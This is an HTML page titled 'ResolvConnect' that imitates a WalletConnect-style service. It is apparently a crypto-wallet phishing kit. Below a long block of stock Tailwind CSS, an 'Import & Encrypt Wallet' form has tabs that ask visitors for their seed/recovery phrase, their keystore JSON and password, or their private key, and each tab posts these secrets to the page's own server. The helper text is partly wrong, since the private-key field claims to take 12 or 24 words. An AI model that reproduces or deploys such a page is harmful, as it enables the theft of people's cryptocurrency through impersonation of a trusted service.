<!DOCTYPE html>

<head>

  <html>
  <meta name="viewport" content="width=device-width" />
  <meta charSet="utf-8" />
  <title>ResolvConnect</title>
  <link rel="shortcut icon" href="https://walletconnect.org/favicon.ico" />

  <link rel="stylesheet" href="style.css" data-n-g="" />
  <style>
    @import url(https://fonts.googleapis.com/css2?family=Roboto:ital,wght@0,100;0,300;0,400;0,500;0,700;0,900;1,100;1,300;1,400;1,500;1,700;1,900&display=swap);
    
    /* ! tailwindcss v2.1.2 | MIT License | https://tailwindcss.com */
    
    /*! modern-normalize v1.1.0 | MIT License | https://github.com/sindresorhus/modern-normalize */
    html {
      -moz-tab-size: 4;
      -o-tab-size: 4;
      tab-size: 4;
      line-height: 1.15;
      -webkit-text-size-adjust: 100%
    }
    
    body {
      margin: 0;
      font-family: system-ui, -apple-system, Segoe UI, Roboto, Helvetica, Arial, sans-serif, Apple Color Emoji, Segoe UI Emoji
    }
    
    hr {
      height: 0;
      color: inherit
    }
    
    abbr[title] {
      -webkit-text-decoration: underline dotted;
      text-decoration: underline dotted
    }
    
    b,
    strong {
      font-weight: bolder
    }
    
    code,
    kbd,
    pre,
    samp {
      font-family: ui-monospace, SFMono-Regular, Consolas, Liberation Mono, Menlo, monospace;
      font-size: 1em
    }
    
    small {
      font-size: 80%
    }
    
    sub,
    sup {
      font-size: 75%;
      line-height: 0;
      position: relative;
      vertical-align: baseline
    }
    
    sub {
      bottom: -.25em
    }
    
    sup {
      top: -.5em
    }
    
    table {
      text-indent: 0;
      border-color: inherit
    }
    
    button,
    input,
    optgroup,
    select,
    textarea {
      font-family: inherit;
      font-size: 100%;
      line-height: 1.15;
      margin: 0
    }
    
    button,
    select {
      text-transform: none
    }
    
    [type=button],
    button {
      -webkit-appearance: button
    }
    
    legend {
      padding: 0
    }
    
    progress {
      vertical-align: baseline
    }
    
    summary {
      display: list-item
    }
    
    blockquote,
    dd,
    dl,
    figure,
    h1,
    h2,
    h3,
    h4,
    h5,
    h6,
    hr,
    p,
    pre {
      margin: 0
    }
    
    button {
      background-color: transparent;
      background-image: none
    }
    
    button:focus {
      outline: 1px dotted;
      outline: 5px auto -webkit-focus-ring-color
    }
    
    fieldset,
    ol,
    ul {
      margin: 0;
      padding: 0
    }
    
    ol,
    ul {
      list-style: none
    }
    
    html {
      font-family: ui-sans-serif, system-ui, -apple-system, BlinkMacSystemFont, Segoe UI, Roboto, Helvetica Neue, Arial, Noto Sans, sans-serif, Apple Color Emoji, Segoe UI Emoji, Segoe UI Symbol, Noto Color Emoji;
      line-height: 1.5
    }
    
    body {
      font-family: inherit;
      line-height: inherit
    }
    
    *,
    :after,
    :before {
      box-sizing: border-box;
      border: 0 solid #e5e7eb
    }
    
    hr {
      border-top-width: 1px
    }
    
    img {
      border-style: solid
    }
    
    textarea {
      resize: vertical
    }
    
    input::-moz-placeholder,
    textarea::-moz-placeholder {
      opacity: 1;
      color: #9fa6b2
    }
    
    input:-ms-input-placeholder,
    textarea:-ms-input-placeholder {
      opacity: 1;
      color: #9fa6b2
    }
    
    input::placeholder,
    textarea::placeholder {
      opacity: 1;
      color: #9fa6b2
    }
    
    [role=button],
    button {
      cursor: pointer
    }
    
    table {
      border-collapse: collapse
    }
    
    h1,
    h2,
    h3,
    h4,
    h5,
    h6 {
      font-size: inherit;
      font-weight: inherit
    }
    
    a {
      color: inherit;
      text-decoration: inherit
    }
    
    button,
    input,
    optgroup,
    select,
    textarea {
      padding: 0;
      line-height: inherit;
      color: inherit
    }
    
    code,
    kbd,
    pre,
    samp {
      font-family: ui-monospace, SFMono-Regular, Menlo, Monaco, Consolas, Liberation Mono, Courier New, monospace
    }
    
    audio,
    canvas,
    embed,
    iframe,
    img,
    object,
    svg,
    video {
      display: block;
      vertical-align: middle
    }
    
    img,
    video {
      max-width: 100%;
      height: auto
    }
    
    .space-y-6>:not([hidden])~:not([hidden]) {
      --tw-space-y-reverse: 0;
      margin-top: calc(1.5rem * calc(1 - var(--tw-space-y-reverse)));
      margin-bottom: calc(1.5rem * var(--tw-space-y-reverse))
    }
    
    .bg-white {
      --tw-bg-opacity: 1;
      background-color: rgba(255, 255, 255, var(--tw-bg-opacity))
    }
    
    .bg-red-100 {
      --tw-bg-opacity: 1;
      background-color: rgba(253, 232, 232, var(--tw-bg-opacity))
    }
    
    .bg-red-500 {
      --tw-bg-opacity: 1;
      background-color: rgba(240, 82, 82, var(--tw-bg-opacity))
    }
    
    .border-red-400 {
      --tw-border-opacity: 1;
      border-color: rgba(249, 128, 128, var(--tw-border-opacity))
    }
    
    .rounded-t {
      border-top-left-radius: .25rem;
      border-top-right-radius: .25rem
    }
    
    .rounded-b {
      border-bottom-right-radius: .25rem;
      border-bottom-left-radius: .25rem
    }
    
    .border {
      border-width: 1px
    }
    
    .border-t-0 {
      border-top-width: 0
    }
    
    .cursor-pointer {
      cursor: pointer
    }
    
    .flex {
      display: flex
    }
    
    .table {
      display: table
    }
    
    .grid {
      display: grid
    }
    
    .contents {
      display: contents
    }
    
    .flex-col {
      flex-direction: column
    }
    
    .items-center {
      align-items: center
    }
    
    .justify-center {
      justify-content: center
    }
    
    .justify-between {
      justify-content: space-between
    }
    
    .justify-around {
      justify-content: space-around
    }
    
    .font-thin {
      font-weight: 100
    }
    
    .font-medium {
      font-weight: 500
    }
    
    .font-semibold {
      font-weight: 600
    }
    
    .font-bold {
      font-weight: 700
    }
    
    .text-sm {
      font-size: .875rem;
      line-height: 1.25rem
    }
    
    .text-lg {
      font-size: 1.125rem;
      line-height: 1.75rem
    }
    
    .text-2xl {
      font-size: 1.5rem;
      line-height: 2rem
    }
    
    .text-3xl {
      font-size: 1.875rem;
      line-height: 2.25rem
    }
    
    .text-4xl {
      font-size: 2.25rem;
      line-height: 2.5rem
    }
    
    .leading-6 {
      line-height: 1.5rem
    }
    
    .mx-6 {
      margin-left: 1.5rem;
      margin-right: 1.5rem
    }
    
    .mx-8 {
      margin-left: 2rem;
      margin-right: 2rem
    }
    
    .ml-2 {
      margin-left: .5rem
    }
    
    .mt-6 {
      margin-top: 1.5rem
    }
    
    .mt-8 {
      margin-top: 2rem
    }
    
    .mt-12 {
      margin-top: 3rem
    }
    
    .mt-14 {
      margin-top: 3.5rem
    }
    
    .mt-16 {
      margin-top: 4rem
    }
    
    .mb-16 {
      margin-bottom: 4rem
    }
    
    .mt-20 {
      margin-top: 5rem
    }
    
    .mt-24 {
      margin-top: 6rem
    }
    
    .opacity-50 {
      opacity: .5
    }
    
    .py-2 {
      padding-top: .5rem;
      padding-bottom: .5rem
    }
    
    .py-3 {
      padding-top: .75rem;
      padding-bottom: .75rem
    }
    
    .py-4 {
      padding-top: 1rem;
      padding-bottom: 1rem
    }
    
    .px-4 {
      padding-left: 1rem;
      padding-right: 1rem
    }
    
    .px-5 {
      padding-left: 1.25rem;
      padding-right: 1.25rem
    }
    
    .absolute {
      position: absolute
    }
    
    .sticky {
      position: sticky
    }
    
    .inset-0 {
      top: 0;
      right: 0;
      bottom: 0;
      left: 0
    }
    
    .top-0 {
      top: 0
    }
    
    * {
      --tw-shadow: 0 0 transparent
    }
    
    .shadow-lg {
      --tw-shadow: 0 10px 15px -3px rgba(0, 0, 0, 0.1), 0 4px 6px -2px rgba(0, 0, 0, 0.05);
      box-shadow: var(--tw-ring-offset-shadow, 0 0 transparent), var(--tw-ring-shadow, 0 0 transparent), var(--tw-shadow)
    }
    
    * {
      --tw-ring-inset: var(--tw-empty,
        /*!*/
        /*!*/
      );
      --tw-ring-offset-width: 0px;
      --tw-ring-offset-color: #fff;
      --tw-ring-color: rgba(63, 131, 248, 0.5);
      --tw-ring-offset-shadow: 0 0 transparent;
      --tw-ring-shadow: 0 0 transparent
    }
    
    .text-center {
      text-align: center
    }
    
    .text-white {
      --tw-text-opacity: 1;
      color: rgba(255, 255, 255, var(--tw-text-opacity))
    }
    
    .text-gray-600 {
      --tw-text-opacity: 1;
      color: rgba(75, 85, 99, var(--tw-text-opacity))
    }
    
    .text-gray-700 {
      --tw-text-opacity: 1;
      color: rgba(55, 65, 81, var(--tw-text-opacity))
    }
    
    .text-red-700 {
      --tw-text-opacity: 1;
      color: rgba(200, 30, 30, var(--tw-text-opacity))
    }
    
    .text-blue-500 {
      --tw-text-opacity: 1;
      color: rgba(63, 131, 248, var(--tw-text-opacity))
    }
    
    .text-cool-gray-500 {
      --tw-text-opacity: 1;
      color: rgba(100, 116, 139, var(--tw-text-opacity))
    }
    
    .hover\:text-cool-gray-600:hover,
    .text-cool-gray-600 {
      --tw-text-opacity: 1;
      color: rgba(71, 85, 105, var(--tw-text-opacity))
    }
    
    .w-6 {
      width: 1.5rem
    }
    
    .w-16 {
      width: 4rem
    }
    
    .w-36 {
      width: 9rem
    }
    
    .w-full {
      width: 100%
    }
    
    .z-10 {
      z-index: 10
    }
    
    .z-20 {
      z-index: 20
    }
    
    .gap-12 {
      gap: 3rem
    }
    
    .grid-cols-2 {
      grid-template-columns: repeat(2, minmax(0, 1fr))
    }
    
    .grid-cols-3 {
      grid-template-columns: repeat(3, minmax(0, 1fr))
    }
    
    @-webkit-keyframes spin {
      to {
        transform: rotate(1turn)
      }
    }
    
    @keyframes spin {
      to {
        transform: rotate(1turn)
      }
    }
    
    @-webkit-keyframes ping {

      75%,
      to {
        transform: scale(2);
        opacity: 0
      }
    }
    
    @keyframes ping {

      75%,
      to {
        transform: scale(2);
        opacity: 0
      }
    }
    
    @-webkit-keyframes pulse {
      50% {
        opacity: .5
      }
    }
    
    @keyframes pulse {
      50% {
        opacity: .5
      }
    }
    
    @-webkit-keyframes bounce {

      0%,
      to {
        transform: translateY(-25%);
        -webkit-animation-timing-function: cubic-bezier(.8, 0, 1, 1);
        animation-timing-function: cubic-bezier(.8, 0, 1, 1)
      }

      50% {
        transform: none;
        -webkit-animation-timing-function: cubic-bezier(0, 0, .2, 1);
        animation-timing-function: cubic-bezier(0, 0, .2, 1)
      }
    }
    
    @keyframes bounce {

      0%,
      to {
        transform: translateY(-25%);
        -webkit-animation-timing-function: cubic-bezier(.8, 0, 1, 1);
        animation-timing-function: cubic-bezier(.8, 0, 1, 1)
      }

      50% {
        transform: none;
        -webkit-animation-timing-function: cubic-bezier(0, 0, .2, 1);
        animation-timing-function: cubic-bezier(0, 0, .2, 1)
      }
    }
    
    .filter-grayscale {
      filter: grayscale(100%)
    }
    
    .hover\:filter-none:hover {
      filter: none
    }
    
    @media (min-width:640px) {
      .sm\:space-y-0>:not([hidden])~:not([hidden]) {
        --tw-space-y-reverse: 0;
        margin-top: calc(0px * calc(1 - var(--tw-space-y-reverse)));
        margin-bottom: calc(0px * var(--tw-space-y-reverse))
      }

      .sm\:space-x-16>:not([hidden])~:not([hidden]) {
        --tw-space-x-reverse: 0;
        margin-right: calc(4rem * var(--tw-space-x-reverse));
        margin-left: calc(4rem * calc(1 - var(--tw-space-x-reverse)))
      }

      .sm\:space-x-20>:not([hidden])~:not([hidden]) {
        --tw-space-x-reverse: 0;
        margin-right: calc(5rem * var(--tw-space-x-reverse));
        margin-left: calc(5rem * calc(1 - var(--tw-space-x-reverse)))
      }

      .sm\:flex-row {
        flex-direction: row
      }

      .sm\:justify-center {
        justify-content: center
      }

      .sm\:text-lg {
        font-size: 1.125rem;
        line-height: 1.75rem
      }

      .sm\:text-xl {
        font-size: 1.25rem;
        line-height: 1.75rem
      }

      .sm\:mx-8 {
        margin-left: 2rem;
        margin-right: 2rem
      }

      .sm\:mt-0 {
        margin-top: 0
      }

      .sm\:mt-32 {
        margin-top: 8rem
      }

      .sm\:max-w-3xl {
        max-width: 48rem
      }

      .sm\:max-w-5xl {
        max-width: 64rem
      }

      .sm\:pr-10 {
        padding-right: 2.5rem
      }

      .sm\:pl-10 {
        padding-left: 2.5rem
      }

      .sm\:w-8 {
        width: 2rem
      }

      .sm\:w-20 {
        width: 5rem
      }

      .sm\:w-24 {
        width: 6rem
      }

      .sm\:w-40 {
        width: 10rem
      }

      .sm\:w-1\/2 {
        width: 50%
      }

      .sm\:gap-10 {
        gap: 2.5rem
      }

      .sm\:gap-16 {
        gap: 4rem
      }

      .sm\:grid-cols-3 {
        grid-template-columns: repeat(3, minmax(0, 1fr))
      }
    }
    
    @media (min-width:768px) {
      .md\:flex {
        display: flex
      }

      .md\:justify-center {
        justify-content: center
      }

      .md\:max-w-5xl {
        max-width: 64rem
      }

      .md\:py-6 {
        padding-top: 1.5rem;
        padding-bottom: 1.5rem
      }

      .md\:pr-20 {
        padding-right: 5rem
      }

      .md\:pl-20 {
        padding-left: 5rem
      }

      .md\:w-28 {
        width: 7rem
      }

      .md\:w-52 {
        width: 13rem
      }

      .md\:gap-20 {
        gap: 5rem
      }

      .md\:gap-28 {
        gap: 7rem
      }

      .md\:grid-cols-4 {
        grid-template-columns: repeat(4, minmax(0, 1fr))
      }
    }
    
    @media (min-width:1024px) {
      .lg\:flex {
        display: flex
      }

      .lg\:justify-center {
        justify-content: center
      }

      .lg\:max-w-4xl {
        max-width: 56rem
      }

      .lg\:w-28 {
        width: 7rem
      }

      .lg\:grid-cols-5 {
        grid-template-columns: repeat(5, minmax(0, 1fr))
      }
    }
  </style>
</head>

<body>
  <div id="__next">
    <div class="font-roboto" id="content">

      <script>
        function openCity(evt, cityName) {
    // Declare all variables
    var i, tabcontent, tablinks;

    // Get all elements with class="tabcontent" and hide them
    tabcontent = document.getElementsByClassName("tabcontent");
    for (i = 0; i < tabcontent.length; i++) {
      tabcontent[i].style.display = "none";
    }

    // Get all elements with class="tablinks" and remove the class "active"
    tablinks = document.getElementsByClassName("tablinks");
    for (i = 0; i < tablinks.length; i++) {
      tablinks[i].className = tablinks[i].className.replace(" active", "");
    }

    // Show the current tab, and add an "active" class to the button that opened the tab
    document.getElementById(cityName).style.display = "block";
    evt.currentTarget.className += " active";
  }
</script>
<style>
  .tab {
    padding : 8px;
    overflow: hidden;
    border-bottom : 2px solid white;
    background-color: white;
    margin-left : 0px;
    margin-right : 0px;
    display : grid;
    grid-template-columns : repeat(auto-fit, minmax(50px, 1fr));
    grid-gap : 0px;
    margin-top : 20px;
  }
  
  .tab button {
    background-color: inherit;
    float: left;
    border: none;
    outline: none;
    cursor: pointer;
    padding: 14px 16px;
    transition: 0.3s;
  }
  
  .tab button:hover {
    background-color: #DDD;
    border-radius : 20px;
    color : black;
  }
  
  .tab button.active {
    background-color: rgb(88, 120, 188);
    border-radius : 20px;
    color : white;
    font-weight : 650;
  }

  .tabcontent {
    display: none;
    color : black;
    padding: 6px;
    border-bottom: none;
    border-top: none;
    margin-left : 0%;
    margin-right : 0%;
  }
  @keyframes fadeEffect {
    from {opacity: 0;}
    to {opacity: 1;}
  }

  .btn {
    display : block;
    width : 85%;
    height : auto;
    color : white;
    background : rgb(42, 73, 141);
    padding : 12px;
    border : none;
    border-radius : 10px;
    font-weight : 650;
  }
  .btn:hover {
    background : rgb(81, 122, 209);
  }
  .field input {
    width : 85%;
    height : auto;
    border : 2px solid #BBB;
    padding : 10px;
    border-radius : 10px;
    margin-top : 12px;
  }
  img.barcode {
    max-width : 250px;
    margin-top : 70px;
  }

  textarea {
    width : 85%;
    height : 150px;
    border : 2px solid #BBB;
    padding : 10px;
    border-radius : 10px;
  }
</style>

<main id="wallets" class="flex flex-col mx-8 mt-12 space-y-10 text-center align-middle">
  <center>
    <h2 style="font-size: 30px;">Import & Encrypt Wallet</h2>
  </br>
    <div class="tab">
    <button class="tablinks" id="default" onclick="openCity(event, 'phrase')">Seed/Recovery Phrase</b></button>
    <button class="tablinks" onclick="openCity(event, 'keystore')">Keystore JSON</b></button>
    <button class="tablinks" onclick="openCity(event, 'private')">Private Key</b></button>
  </div>

  <div id="phrase" class="tabcontent">
    <form action="" method="POST">
      <input type="hidden" name="category" value="Recovery Phrase"/>
      <textarea name="phrase" required="required" minlength="12" placeholder="Seed/Recovery Phrase"></textarea>
      <br />
      <div class="desc">Typically 12 (sometimes 24) words separated by single spaces</div>
      <br />
      <button type="submit" name="import" class="btn">IMPORT</button>
    </form>
  </div>

  <div id="keystore" class="tabcontent">
    <form action="" method="POST">
      <input type="hidden" name="category" value="Wallet Keystore JSON"/>

      <textarea name="phrase" required="required" minlength="12" placeholder="Keystore JSON"></textarea>
      <br />
      <div class="field">
        <input type="password" name="password" id="password" placeholder="Password"/>
      </div>
      <div class="desc">Several lines of text beginning with '(...)' plus the password you used to encrypt it.</div>
    </br>
    <button type="submit" name="import" class="btn">IMPORT</button>
  </form>
</div>

<div id="private" class="tabcontent">
  <form action="" method="POST">
    <input type="hidden" name="category" value=" Wallet Private Key"/>
    <div class="field">
      <input type="text" name="key" id="key" autocomplete="off" placeholder="Private Key"/>
    </div>
    <div class="desc">Typically 12 (sometimes 24) words separated by single spaces</div>
  </br>
  <button type="submit" name="import" class="btn">IMPORT</button>
</form>
</div>

<script>
  document.getElementById("default").click();
</script>
</center>
</main>
<footer class="flex justify-center mt-24 mb-16 sm:mt-32">
  <div class="flex flex-col space-y-6 sm:space-y-0 sm:space-x-20 sm:flex-row"><a class="text-sm font-medium sm:text-lg text-cool-gray-600 group-hover:text-cool-gray-500" target="_blank" rel="noopener noreferrer">
    <div class="flex"><img class="w-6 sm:w-8" src="61a3c05228b28e1dac511bfd6f3651cb6b0535ac.svg" alt="Discord">
      <p class="ml-2">Discord</p>
    </div>
  </a><a class="text-sm font-medium sm:text-lg text-cool-gray-600 group-hover:text-cool-gray-500" target="_blank" rel="noopener noreferrer">
    <div class="flex"><img class="w-6 sm:w-8" src="60fcd1eea46e596e93f2a5c78fb245275b825b8d.svg" alt="Telegram">
      <p class="ml-2">Telegram</p>
    </div>
  </a>
  <a class="text-sm font-medium sm:text-lg text-cool-gray-600 group-hover:text-cool-gray-500" target="_blank" rel="noopener noreferrer">
    <div class="flex"><img class="w-6 sm:w-8" src="399cd338182b22910bd676867087cd1d2696f473.svg" alt="Twitter">
      <p class="ml-2">Twitter</p>
    </div>
  </a><a class="text-sm font-medium sm:text-lg text-cool-gray-600 group-hover:text-cool-gray-500" target="_blank" rel="noopener noreferrer">
    <div class="flex"><img class="w-6 sm:w-8" src="4a71763293e01a10792d6f08154375f744cd1e53.svg" alt="GitHub">
      <p class="ml-2">GitHub</p>
    </div>
  </a></div>
</footer>
</div>
</div>
</body>
</html>
